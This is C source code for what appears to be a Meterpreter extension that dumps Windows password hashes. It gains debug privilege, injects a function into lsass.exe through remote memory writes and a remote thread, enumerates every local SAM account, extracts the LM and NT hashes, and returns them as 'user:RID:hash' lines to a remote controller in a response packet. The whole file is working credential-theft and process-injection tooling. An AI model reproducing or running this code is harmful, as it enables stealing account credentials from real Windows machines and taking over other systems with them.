#include "precomp.h"
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <ntsecapi.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>

/* define the type of information to retrieve from the SAM */
#define SAM_USER_INFO_PASSWORD_OWFS 0x12

/* define types for samsrv functions */
typedef struct _SAM_DOMAIN_USER {
	DWORD				dwUserId;
	LSA_UNICODE_STRING  wszUsername;
} SAM_DOMAIN_USER;

typedef struct _SAM_DOMAIN_USER_ENUMERATION {
	DWORD               dwDomainUserCount;
	SAM_DOMAIN_USER     *pSamDomainUser;
} SAM_DOMAIN_USER_ENUMERATION;

/* define the type for passing data */
typedef struct _USERNAMEHASH {
	char	*Username;
	DWORD	Length;
	DWORD	RID;
	char	Hash[32];
} USERNAMEHASH;

/* define types for kernel32 functions */
typedef FARPROC (WINAPI *GetProcAddressType)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *LoadLibraryType)(LPCSTR);
typedef BOOL	(WINAPI *FreeLibraryType)(HMODULE);
typedef HANDLE	(WINAPI *OpenEventType)(DWORD, BOOL, LPCTSTR);
typedef BOOL	(WINAPI *SetEventType)(HANDLE);
typedef BOOL	(WINAPI *CloseHandleType)(HANDLE);
typedef DWORD	(WINAPI *WaitForSingleObjectType)(HANDLE, DWORD);

/* define the context/argument structure */
typedef struct {

	/* kernel32 function pointers */
	LoadLibraryType			LoadLibrary;
	GetProcAddressType		GetProcAddress;
	FreeLibraryType			FreeLibrary;
	OpenEventType			OpenEvent;
	SetEventType			SetEvent;
	CloseHandleType			CloseHandle;
	WaitForSingleObjectType	WaitForSingleObject;

	/* samsrv strings */
	char samsrvdll[11];
	char samiconnect[12];
	char samropendomain[15];
	char samropenuser[13];
	char samrqueryinformationuser[25];
	char samrenumerateusersindomain[27];
	char samifree_sampr_user_info_buffer[32];
	char samifree_sampr_enumeration_buffer[34];
	char samrclosehandle[16];

	/* advapi32 strings */
	char advapi32dll[13];
	char lsaopenpolicy[14];
	char lsaqueryinformationpolicy[26];
	char lsaclose[9];

	/* msvcrt strings */
	char msvcrtdll[11];
	char malloc[7];
	char realloc[8];
	char free[5];
	char memcpy[7];
		
	/* ntdll strings */
	char ntdlldll[10];
	char wcstombs[9];

	/* kernel sync object strings */
	char ReadSyncEvent[4];
	char FreeSyncEvent[5];

	/* maximum wait time for sync */
	DWORD dwMillisecondsToWait;

	/* return values */
	DWORD			dwDataSize;
	USERNAMEHASH	*pUsernameHashData;
	
} FUNCTIONARGS;

/* define types for samsrv */
typedef LONG	  NTSTATUS;
typedef NTSTATUS (WINAPI *SamIConnectType)(DWORD, PHANDLE, DWORD, DWORD);
typedef NTSTATUS (WINAPI *SamrOpenDomainType)(HANDLE, DWORD, PSID, HANDLE *);
typedef NTSTATUS (WINAPI *SamrOpenUserType)(HANDLE, DWORD, DWORD, HANDLE *);
typedef NTSTATUS (WINAPI *SamrEnumerateUsersInDomainType)(HANDLE, HANDLE *, DWORD, SAM_DOMAIN_USER_ENUMERATION **, DWORD, DWORD *);
typedef NTSTATUS (WINAPI *SamrQueryInformationUserType)(HANDLE, DWORD, PVOID);
typedef VOID	 (WINAPI *SamIFree_SAMPR_USER_INFO_BUFFERType)(PVOID, DWORD);
typedef VOID	 (WINAPI *SamIFree_SAMPR_ENUMERATION_BUFFERType)(PVOID);
typedef NTSTATUS (WINAPI *SamrCloseHandleType)(HANDLE *);

/* define types for advapi32 */
typedef NTSTATUS (WINAPI *LsaOpenPolicyType)(PLSA_UNICODE_STRING, PLSA_OBJECT_ATTRIBUTES, ACCESS_MASK, PLSA_HANDLE);
typedef	NTSTATUS (WINAPI *LsaQueryInformationPolicyType)(LSA_HANDLE, POLICY_INFORMATION_CLASS, PVOID *);
typedef NTSTATUS (WINAPI *LsaCloseType)(LSA_HANDLE);

/* define types for msvcrt */
typedef void *(*MallocType)(size_t);
typedef void *(*ReallocType)(void *, size_t);
typedef void (*FreeType)(void *);
typedef void *(*MemcpyType)(void *, const void *, size_t);

/* define types for ntdll */
typedef size_t (*WcstombsType)(char *, const wchar_t *, size_t);



char *StringCombine(char *string1, char *string2) {

	if (string2 == NULL) { // nothing to append
		return string1;
	}

	if (string1 == NULL) { // create a new string
		string1 = (char *)malloc(strlen(string2) + 1);
		strncpy(string1, string2, strlen(string2) + 1);
	} else {			   // append data to the string
		string1 = (char *)realloc(string1, strlen(string1) + strlen(string2) + 1);
		string1 = strncat(string1, string2, strlen(string2) + 1);
	}

	return string1;
}

/* retrieve a handle to lsass.exe */
HANDLE GetLsassHandle() {

	DWORD	dwProcessList[1024];
	DWORD	dwProcessListSize;
	HANDLE	hProcess;
	char	szProcessName[10];
	DWORD	dwCount;

	/* enumerate all pids on the system */
	if (EnumProcesses(dwProcessList, sizeof(dwProcessList), &dwProcessListSize)) {

		/* only look in the first 256 process ids for lsass.exe */
		if (dwProcessListSize > sizeof(dwProcessList))
			dwProcessListSize = sizeof(dwProcessList);

		/* iterate through all pids, retrieve the executable name, and match to lsass.exe */
		for (dwCount = 0; dwCount < dwProcessListSize; dwCount++) {
			if (hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessList[dwCount])) {
				if (GetModuleBaseName(hProcess, NULL, szProcessName, sizeof(szProcessName))) {
					if (strcmp(szProcessName, "lsass.exe") == 0) {
						return hProcess;
					}
				}
				CloseHandle(hProcess);
			}
		}
	}
	return 0;
}

/* set the process to have the SE_DEBUG_NAME privilige */
int SetAccessPriv() {

    HANDLE hToken;
    TOKEN_PRIVILEGES priv;

	/* open the current process token, retrieve the LUID for SeDebug, enable the privilege, reset the token information */
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid)) {

			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			priv.PrivilegeCount = 1;
 
			if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL)) {
				CloseHandle(hToken);
				return 1;
			}
		}
		CloseHandle(hToken);
	}
	return 0;
}

int dumpSAM(FUNCTIONARGS *fargs) {

	/* variables for samsrv function pointers */
	HANDLE hSamSrv = NULL, hSam = NULL;
	SamIConnectType pSamIConnect;
	SamrOpenDomainType pSamrOpenDomain;
	SamrEnumerateUsersInDomainType pSamrEnumerateUsersInDomain;
	SamrOpenUserType pSamrOpenUser;
	SamrQueryInformationUserType pSamrQueryInformationUser;
	SamIFree_SAMPR_USER_INFO_BUFFERType pSamIFree_SAMPR_USER_INFO_BUFFER;
	SamIFree_SAMPR_ENUMERATION_BUFFERType pSamIFree_SAMPR_ENUMERATION_BUFFER;
	SamrCloseHandleType pSamrCloseHandle;

	/* variables for samsrv functions */
	HANDLE hEnumerationHandle = NULL, hDomain = NULL, hUser = NULL;
	SAM_DOMAIN_USER_ENUMERATION *pEnumeratedUsers = NULL;
	DWORD dwNumberOfUsers = 0;
	PVOID pvUserInfo = 0;

	/* variables for advapi32 function pointers */
	HANDLE hAdvApi32 = NULL;
	LsaOpenPolicyType pLsaOpenPolicy;
	LsaQueryInformationPolicyType pLsaQueryInformationPolicy;
	LsaCloseType pLsaClose;

	/* variables for advapi32 functions */
	LSA_HANDLE hLSA = NULL;
	LSA_OBJECT_ATTRIBUTES ObjectAttributes;
	POLICY_ACCOUNT_DOMAIN_INFO *pAcctDomainInfo = NULL;

	/* variables for msvcrt */
	HANDLE hMsvcrt = NULL;
	MallocType pMalloc;
	ReallocType pRealloc;
	FreeType pFree;
	MemcpyType pMemcpy;

	/* variables for ntdll */
	HANDLE hNtDll = NULL;
	WcstombsType pWcstombs;

	/* general variables */
	NTSTATUS status;
	HANDLE hReadLock = NULL, hFreeLock = NULL;
	DWORD dwUsernameLength = 0, dwCurrentUser = 0, dwStorageIndex = 0;
	DWORD dwError = 0;

	/* load samsrv functions */
	hSamSrv = fargs->LoadLibrary(fargs->samsrvdll);
	if (hSamSrv == NULL) { dwError = 1; goto cleanup; }	
	
	pSamIConnect = (SamIConnectType)fargs->GetProcAddress(hSamSrv, fargs->samiconnect);
	pSamrOpenDomain = (SamrOpenDomainType)fargs->GetProcAddress(hSamSrv, fargs->samropendomain);
	pSamrEnumerateUsersInDomain = (SamrEnumerateUsersInDomainType)fargs->GetProcAddress(hSamSrv, fargs->samrenumerateusersindomain);
	pSamrOpenUser = (SamrOpenUserType)fargs->GetProcAddress(hSamSrv, fargs->samropenuser);
	pSamrQueryInformationUser = (SamrQueryInformationUserType)fargs->GetProcAddress(hSamSrv, fargs->samrqueryinformationuser);
	pSamIFree_SAMPR_USER_INFO_BUFFER = (SamIFree_SAMPR_USER_INFO_BUFFERType)fargs->GetProcAddress(hSamSrv, fargs->samifree_sampr_user_info_buffer);
	pSamIFree_SAMPR_ENUMERATION_BUFFER = (SamIFree_SAMPR_ENUMERATION_BUFFERType)fargs->GetProcAddress(hSamSrv, fargs->samifree_sampr_enumeration_buffer);
	pSamrCloseHandle = (SamrCloseHandleType)fargs->GetProcAddress(hSamSrv, fargs->samrclosehandle);	
	if (!pSamIConnect || !pSamrOpenDomain || !pSamrEnumerateUsersInDomain || !pSamrOpenUser || !pSamrQueryInformationUser || 
		!pSamIFree_SAMPR_USER_INFO_BUFFER || !pSamIFree_SAMPR_ENUMERATION_BUFFER || !pSamrCloseHandle) {
			dwError = 1;
			goto cleanup;
		}

	/* load advadpi32 functions */
	hAdvApi32 = fargs->LoadLibrary(fargs->advapi32dll);
	if (hAdvApi32 == NULL) { dwError = 1; goto cleanup; }

	pLsaOpenPolicy = (LsaOpenPolicyType)fargs->GetProcAddress(hAdvApi32, fargs->lsaopenpolicy);
	pLsaQueryInformationPolicy = (LsaQueryInformationPolicyType)fargs->GetProcAddress(hAdvApi32, fargs->lsaqueryinformationpolicy);
	pLsaClose = (LsaCloseType)fargs->GetProcAddress(hAdvApi32, fargs->lsaclose);
	if (!pLsaOpenPolicy || !pLsaQueryInformationPolicy || !pLsaClose) { dwError = 1; goto cleanup; }

	/* load msvcrt functions */
	hMsvcrt = fargs->LoadLibrary(fargs->msvcrtdll);
	if (hMsvcrt == NULL) { dwError = 1; goto cleanup; }

	pMalloc = (MallocType)fargs->GetProcAddress(hMsvcrt, fargs->malloc);
	pRealloc = (ReallocType)fargs->GetProcAddress(hMsvcrt, fargs->realloc);
	pFree = (FreeType)fargs->GetProcAddress(hMsvcrt, fargs->free);
	pMemcpy = (MemcpyType)fargs->GetProcAddress(hMsvcrt, fargs->memcpy);
	if (!pMalloc || !pRealloc || !pFree || !pMemcpy) { dwError = 1; goto cleanup; }

	/* load ntdll functions */
	hNtDll = fargs->LoadLibrary(fargs->ntdlldll);
	if (hNtDll == NULL) { dwError = 1; goto cleanup; }
	
	pWcstombs = (WcstombsType)fargs->GetProcAddress(hNtDll, fargs->wcstombs);
	if (!pWcstombs) { dwError = 1; goto cleanup; }

	/* initialize the LSA_OBJECT_ATTRIBUTES structure */
	ObjectAttributes.RootDirectory = NULL;
	ObjectAttributes.ObjectName = NULL;
	ObjectAttributes.Attributes = 0;
	ObjectAttributes.SecurityDescriptor = NULL;
	ObjectAttributes.SecurityQualityOfService = NULL;
	ObjectAttributes.Length = sizeof(LSA_OBJECT_ATTRIBUTES);

	/* open a handle to the LSA policy */
	if (pLsaOpenPolicy(NULL, &ObjectAttributes, POLICY_ALL_ACCESS, &hLSA) < 0) { dwError = 1; goto cleanup; }
	if (pLsaQueryInformationPolicy(hLSA, PolicyAccountDomainInformation, &pAcctDomainInfo) < 0) { dwError = 1; goto cleanup; }

	/* connect to the SAM database */
	if (pSamIConnect(0, &hSam, MAXIMUM_ALLOWED, 1) < 0) { dwError = 1; goto cleanup; }
	if (pSamrOpenDomain(hSam, 0xf07ff, pAcctDomainInfo->DomainSid, &hDomain) < 0) { dwError = 1; goto cleanup; }

	/* enumerate all users and store username, rid, and hashes */
	do {
		status = pSamrEnumerateUsersInDomain(hDomain, &hEnumerationHandle, 0, &pEnumeratedUsers, 0xFFFF, &dwNumberOfUsers);
		if (status < 0) { break; }	// error
									// 0x0 = no more, 0x105 = more users
		if (!dwNumberOfUsers) { break; }	// exit if no users remain

		if (fargs->dwDataSize == 0) {	// first allocation
			fargs->dwDataSize = dwNumberOfUsers * sizeof(USERNAMEHASH);
			fargs->pUsernameHashData = pMalloc(fargs->dwDataSize);
		} else {						// subsequent allocations
			fargs->dwDataSize += dwNumberOfUsers * sizeof(USERNAMEHASH);
			fargs->pUsernameHashData = pRealloc(fargs->pUsernameHashData, fargs->dwDataSize);
		}
		if (fargs->pUsernameHashData == NULL) { dwError = 1; goto cleanup; }

		for (dwCurrentUser = 0; dwCurrentUser < dwNumberOfUsers; dwCurrentUser++) {

			if (pSamrOpenUser(hDomain, MAXIMUM_ALLOWED, pEnumeratedUsers->pSamDomainUser[dwCurrentUser].dwUserId, &hUser) < 0) { dwError = 1; goto cleanup; }
			if (pSamrQueryInformationUser(hUser, SAM_USER_INFO_PASSWORD_OWFS, &pvUserInfo) < 0) { dwError = 1; goto cleanup; }

			/* allocate space for another username */
			dwUsernameLength = (pEnumeratedUsers->pSamDomainUser[dwCurrentUser].wszUsername.Length / 2) + 1;
			(fargs->pUsernameHashData)[dwStorageIndex].Username = (char *)pMalloc(dwUsernameLength);
			if ((fargs->pUsernameHashData)[dwStorageIndex].Username == NULL) { dwError = 1; goto cleanup; } 
			
			/* copy over the new name, length, rid and password hash */
			pWcstombs((fargs->pUsernameHashData)[dwStorageIndex].Username, pEnumeratedUsers->pSamDomainUser[dwCurrentUser].wszUsername.Buffer, dwUsernameLength);
			(fargs->pUsernameHashData)[dwStorageIndex].Length = dwUsernameLength;
			(fargs->pUsernameHashData)[dwStorageIndex].RID = pEnumeratedUsers->pSamDomainUser[dwCurrentUser].dwUserId;
			pMemcpy((fargs->pUsernameHashData)[dwStorageIndex].Hash, pvUserInfo, 32);

			/* clean up */
			pSamIFree_SAMPR_USER_INFO_BUFFER(pvUserInfo, SAM_USER_INFO_PASSWORD_OWFS);
			pSamrCloseHandle(&hUser);
			pvUserInfo = 0;
			hUser = 0;

			/* move to the next storage element */
			dwStorageIndex++;
		}

		pSamIFree_SAMPR_ENUMERATION_BUFFER(pEnumeratedUsers);
		pEnumeratedUsers = NULL;

	} while (status == 0x105);

	/* set the event to signify that the data is ready */
	hReadLock = fargs->OpenEvent(EVENT_MODIFY_STATE, FALSE, fargs->ReadSyncEvent);
	if (hReadLock == NULL) { dwError = 1; goto cleanup; }
	if (fargs->SetEvent(hReadLock) == 0) { dwError = 1; goto cleanup; }
	
	/* wait for the copying to finish before freeing all the allocated memory */
	hFreeLock = fargs->OpenEvent(EVENT_ALL_ACCESS, FALSE, fargs->FreeSyncEvent);
	if (hFreeLock == NULL) { dwError = 1; goto cleanup; }
	if (fargs->WaitForSingleObject(hFreeLock, fargs->dwMillisecondsToWait) != WAIT_OBJECT_0) { dwError = 1; goto cleanup; }

cleanup: 

	/* free all the allocated memory */
	for (dwCurrentUser = 0; dwCurrentUser < dwStorageIndex; dwCurrentUser++) {
		pFree((fargs->pUsernameHashData)[dwCurrentUser].Username);
	}
	pFree(fargs->pUsernameHashData);

	/* close all handles */
	pSamrCloseHandle(&hDomain);
	pSamrCloseHandle(&hSam);	
	pLsaClose(hLSA);

	/* free library handles */
	if (hSamSrv) { fargs->FreeLibrary(hSamSrv);	}
	if (hAdvApi32) { fargs->FreeLibrary(hAdvApi32); }
	if (hMsvcrt) { fargs->FreeLibrary(hMsvcrt); }
	if (hNtDll) { fargs->FreeLibrary(hNtDll); }

	/* signal that the memory deallocation is complete */
	fargs->SetEvent(hReadLock);
	fargs->CloseHandle(hReadLock);
	
	/* release the free handle */
	fargs->CloseHandle(hFreeLock);

	/* return correct code */
	return dwError;
}

#ifdef _WIN64
#define sizer setArgs
#else
void sizer() { __asm { ret } }
#endif

/* initialize the context structure - returns 0 on success, return 1 on error */
int setArgs(FUNCTIONARGS *fargs, DWORD dwMillisecondsToWait) {

	HANDLE hLibrary = NULL;

	/* set loadlibrary and getprocaddress function addresses */
	hLibrary = LoadLibrary("kernel32");
	if (hLibrary == NULL) { return 1; }

	fargs->LoadLibrary = (LoadLibraryType)GetProcAddress(hLibrary, "LoadLibraryA");
	fargs->GetProcAddress = (GetProcAddressType)GetProcAddress(hLibrary, "GetProcAddress");
	fargs->FreeLibrary = (FreeLibraryType)GetProcAddress(hLibrary, "FreeLibrary");
	fargs->OpenEvent = (OpenEventType)GetProcAddress(hLibrary, "OpenEventA");
	fargs->SetEvent = (SetEventType)GetProcAddress(hLibrary, "SetEvent");
	fargs->CloseHandle = (CloseHandleType)GetProcAddress(hLibrary, "CloseHandle");
	fargs->WaitForSingleObject = (WaitForSingleObjectType)GetProcAddress(hLibrary, "WaitForSingleObject");

	if (!fargs->LoadLibrary || !fargs->GetProcAddress || !fargs->FreeLibrary || !fargs->OpenEvent || !fargs->SetEvent || !fargs->CloseHandle || !fargs->WaitForSingleObject) { 
		CloseHandle(hLibrary);
		return 1;
	}

	/* initialize samsrv strings */
	strncpy(fargs->samsrvdll, "samsrv.dll", sizeof(fargs->samsrvdll));
	strncpy(fargs->samiconnect, "SamIConnect", sizeof(fargs->samiconnect));
	strncpy(fargs->samropendomain, "SamrOpenDomain", sizeof(fargs->samropendomain));
	strncpy(fargs->samropenuser, "SamrOpenUser", sizeof(fargs->samropenuser));
	strncpy(fargs->samrqueryinformationuser, "SamrQueryInformationUser", sizeof(fargs->samrqueryinformationuser));
	strncpy(fargs->samrenumerateusersindomain, "SamrEnumerateUsersInDomain", sizeof(fargs->samrenumerateusersindomain));
	strncpy(fargs->samifree_sampr_user_info_buffer, "SamIFree_SAMPR_USER_INFO_BUFFER", sizeof(fargs->samifree_sampr_user_info_buffer));
	strncpy(fargs->samifree_sampr_enumeration_buffer, "SamIFree_SAMPR_ENUMERATION_BUFFER", sizeof(fargs->samifree_sampr_enumeration_buffer));
	strncpy(fargs->samrclosehandle, "SamrCloseHandle", sizeof(fargs->samrclosehandle));

	/* initialize advapi32 strings */
	strncpy(fargs->advapi32dll, "advapi32.dll", sizeof(fargs->advapi32dll));
	strncpy(fargs->lsaopenpolicy, "LsaOpenPolicy", sizeof(fargs->lsaopenpolicy));
	strncpy(fargs->lsaqueryinformationpolicy, "LsaQueryInformationPolicy", sizeof(fargs->lsaqueryinformationpolicy));
	strncpy(fargs->lsaclose, "LsaClose", sizeof(fargs->lsaclose));

	/* initialize msvcrt strings */
	strncpy(fargs->msvcrtdll, "msvcrt.dll", sizeof(fargs->msvcrtdll));
	strncpy(fargs->malloc, "malloc", sizeof(fargs->malloc));
	strncpy(fargs->realloc, "realloc", sizeof(fargs->realloc));
	strncpy(fargs->free, "free", sizeof(fargs->free));
	strncpy(fargs->memcpy, "memcpy", sizeof(fargs->memcpy));

	/* initialize ntdll strings */
	strncpy(fargs->ntdlldll, "ntdll.dll", sizeof(fargs->ntdlldll));
	strncpy(fargs->wcstombs, "wcstombs", sizeof(fargs->wcstombs));

	/* initialize kernel sync objects */
	strncpy(fargs->ReadSyncEvent, "SAM", sizeof(fargs->ReadSyncEvent));
	strncpy(fargs->FreeSyncEvent, "FREE", sizeof(fargs->FreeSyncEvent));

	/* initialize wait time */
	fargs->dwMillisecondsToWait = dwMillisecondsToWait;

	/* initailize variables */
	fargs->dwDataSize = 0;
	fargs->pUsernameHashData = NULL;

	/* clean up */
	CloseHandle(hLibrary);

	return 0;
}

/* 
control function driving the dumping - return 0 on success, 1 on error 

dwMillisecondsToWait = basically controls how long to wait for the results
*/
int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults) {

	HANDLE hThreadHandle = NULL, hLsassHandle = NULL, hReadLock = NULL, hFreeLock = NULL;
	LPVOID pvParameterMemory = NULL, pvFunctionMemory = NULL;
	int FunctionSize;
	SIZE_T sBytesWritten = 0, sBytesRead = 0;
	DWORD dwThreadId = 0, dwNumberOfUsers = 0, dwCurrentUserIndex = 0, HashIndex = 0;
	FUNCTIONARGS InitFunctionArguments, FinalFunctionArguments;
	USERNAMEHASH *UsernameHashResults = NULL;
	PVOID UsernameAddress = NULL;
	DWORD dwError = 0;
	char *hashstring = NULL;

	/* METERPRETER CODE */
	char buffer[100];
	/* END METERPRETER CODE */

	do {

		/* ORANGE control input - move this to the client perl side */
		if (dwMillisecondsToWait < 60000) { dwMillisecondsToWait = 60000; }
		if (dwMillisecondsToWait > 300000) { dwMillisecondsToWait = 300000; }

		/* create the event kernel sync objects */
		hReadLock = CreateEvent(NULL, FALSE, FALSE, "SAM");
		hFreeLock = CreateEvent(NULL, FALSE, FALSE, "FREE");
		if (!hReadLock || !hFreeLock) { dwError = 1; break; }

		/* calculate the function size */
		FunctionSize = (DWORD)sizer - (DWORD)dumpSAM;
		if (FunctionSize <= 0) {
			printf("Error calculating the function size.\n");
			dwError = 1;
			break;
		}

		/* set access priv */
		if (SetAccessPriv() == 0) {
			printf("Error setting SE_DEBUG_NAME privilege\n");
			dwError = 1;
			break;
		}

		/* get the lsass handle */
		hLsassHandle = GetLsassHandle();
		if (hLsassHandle == 0) {
			printf("Error getting lsass.exe handle.\n");
			dwError = 1;
			break;
		}

		/* set the arguments in the context structure */
		if (setArgs(&InitFunctionArguments, dwMillisecondsToWait)) { dwError = 1; break; }

		/* allocate memory for the context structure */
		pvParameterMemory = VirtualAllocEx(hLsassHandle, NULL, sizeof(FUNCTIONARGS), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (pvParameterMemory == NULL) { dwError = 1; break; }

		/* write context structure into remote process */
		if (WriteProcessMemory(hLsassHandle, pvParameterMemory, &InitFunctionArguments, sizeof(InitFunctionArguments), &sBytesWritten) == 0) { dwError = 1; break; }
		if (sBytesWritten != sizeof(InitFunctionArguments)) { dwError = 1; break; }
		sBytesWritten = 0;

		/* allocate memory for the function */
		pvFunctionMemory = VirtualAllocEx(hLsassHandle, NULL, FunctionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (pvFunctionMemory == NULL) { dwError = 1; break; }

		/* write the function into the remote process */
		if (WriteProcessMemory(hLsassHandle, pvFunctionMemory, dumpSAM, FunctionSize, &sBytesWritten) == 0) { dwError = 1; break; }
		if (sBytesWritten != FunctionSize) { dwError = 1; break; }
		sBytesWritten = 0;

		/* start the remote thread */
		if ((hThreadHandle = CreateRemoteThread(hLsassHandle, NULL, 0, (LPTHREAD_START_ROUTINE)pvFunctionMemory, pvParameterMemory, 0, &dwThreadId)) == NULL) { dwError = 1; break; }
		
		/* wait until the data is ready to be collected */
		if (WaitForSingleObject(hReadLock, dwMillisecondsToWait) != WAIT_OBJECT_0) {
			printf("Timed out waiting for the data to be collected.\n");
			dwError = 1;
			break;
		}

		/* read results of the injected function */
		if (ReadProcessMemory(hLsassHandle, pvParameterMemory, &FinalFunctionArguments, sizeof(InitFunctionArguments), &sBytesRead) == 0) { dwError = 1; break; }
		if (sBytesRead != sizeof(InitFunctionArguments)) { dwError = 1; break; }
		sBytesRead = 0;

		/* allocate space for the results */
		UsernameHashResults = (USERNAMEHASH *)malloc(FinalFunctionArguments.dwDataSize);
		if (UsernameHashResults == NULL) { dwError = 1; break; }

		/* determine the number of elements and copy over the data */
		dwNumberOfUsers = FinalFunctionArguments.dwDataSize / sizeof(USERNAMEHASH);

		/* copy the context structure */
		if (ReadProcessMemory(hLsassHandle, FinalFunctionArguments.pUsernameHashData, UsernameHashResults, FinalFunctionArguments.dwDataSize, &sBytesRead) == 0) { break; }
		if (sBytesRead != FinalFunctionArguments.dwDataSize) { break; }
		sBytesRead = 0;

		// save the old mem addy, malloc new space, copy over the data, free the old mem addy
		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++) {
			UsernameAddress = UsernameHashResults[dwCurrentUserIndex].Username;
			
			UsernameHashResults[dwCurrentUserIndex].Username = (char *)malloc(UsernameHashResults[dwCurrentUserIndex].Length);
			if (UsernameHashResults[dwCurrentUserIndex].Username == NULL) { dwError = 1; break; }

			if (ReadProcessMemory(hLsassHandle, UsernameAddress, UsernameHashResults[dwCurrentUserIndex].Username, UsernameHashResults[dwCurrentUserIndex].Length, &sBytesRead) == 0) { dwError = 1; break; }
			if (sBytesRead != UsernameHashResults[dwCurrentUserIndex].Length) { dwError = 1; break; }
		}

		/* signal that all data has been read and wait for the remote memory to be free'd */
		if (SetEvent(hFreeLock) == 0) { dwError = 1; break; }
		if (WaitForSingleObject(hReadLock, dwMillisecondsToWait) != WAIT_OBJECT_0) {
			printf("The timeout pooped.\n");
			dwError = 1;
			break;
		}

		/* display the results and free the malloc'd memory for the username */
		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++) {

			/* METERPRETER CODE */
			hashstring = StringCombine(hashstring, UsernameHashResults[dwCurrentUserIndex].Username);
			hashstring = StringCombine(hashstring, ":");
			_snprintf(buffer, 30, "%d", UsernameHashResults[dwCurrentUserIndex].RID);
			hashstring = StringCombine(hashstring, buffer);
			hashstring = StringCombine(hashstring, ":");
			/* END METERPRETER CODE */

			//printf("%s:%d:", UsernameHashResults[dwCurrentUserIndex].Username, UsernameHashResults[dwCurrentUserIndex].RID);
			for (HashIndex = 16; HashIndex < 32; HashIndex++) {
				/* ORANGE - insert check for ***NO PASSWORD***		
					if( (regData[4] == 0x35b4d3aa) && (regData[5] == 0xee0414b5)
                    && (regData[6] == 0x35b4d3aa) && (regData[7] == 0xee0414b5) )
                    sprintf( LMdata, "NO PASSWORD*********************" );
				*/
				_snprintf(buffer, 3, "%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
				hashstring = StringCombine(hashstring, buffer);
				//printf("%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
			}
			hashstring = StringCombine(hashstring, ":");
			//printf(":");
			for (HashIndex = 0; HashIndex < 16; HashIndex++) {
				/* ORANGE - insert check for ***NO PASSWORD***
					if( (regData[0] == 0xe0cfd631) && (regData[1] == 0x31e96ad1)
                    && (regData[2] == 0xd7593cb7) && (regData[3] == 0xc089c0e0) )
                    sprintf( NTdata, "NO PASSWORD*********************" );
				*/
				_snprintf(buffer, 3, "%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
				hashstring = StringCombine(hashstring, buffer);
				//printf("%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
			}

			hashstring = StringCombine(hashstring, ":::\n");
			//printf(":::\n");
		}
	} while(0);

	/* relesase the event objects */
	if (hReadLock) { CloseHandle(hReadLock); }
	if (hFreeLock) { CloseHandle(hFreeLock); }

	/* close handle to lsass */
	if (hLsassHandle) { CloseHandle(hLsassHandle); }

	/* free the context structure and the injected function and the results */
	if (pvParameterMemory) { VirtualFreeEx(hLsassHandle, pvParameterMemory, sizeof(FUNCTIONARGS), MEM_RELEASE); }
	if (pvFunctionMemory) { VirtualFreeEx(hLsassHandle, pvFunctionMemory, FunctionSize, MEM_RELEASE); }

	/* free the remote thread handle */
	if (hThreadHandle) { CloseHandle(hThreadHandle); }

	/* free the results structure including individually malloced space for usernames */
	if (UsernameHashResults) { 
		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++) {
			if (UsernameHashResults[dwCurrentUserIndex].Username) {
				free(UsernameHashResults[dwCurrentUserIndex].Username);
			}
		}
		free(UsernameHashResults); 
	}

	/* return hashresults */
	*hashresults = hashstring;

	/* return the correct code */
	return dwError;
}

/*
 * Grabs the LanMan Hashes from the SAM database.
 */
DWORD request_passwd_get_sam_hashes(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	char *hashes = NULL;

	do
	{
		// Get the hashes
		if (control(120000, &hashes))
		{
			res = GetLastError();
			break;
		}

		packet_add_tlv_string(response, TLV_TYPE_SAM_HASHES, hashes);

	} while (0);

	packet_transmit_response(res, remote, response);

	if (hashes)
		free(hashes);

	return res;
}
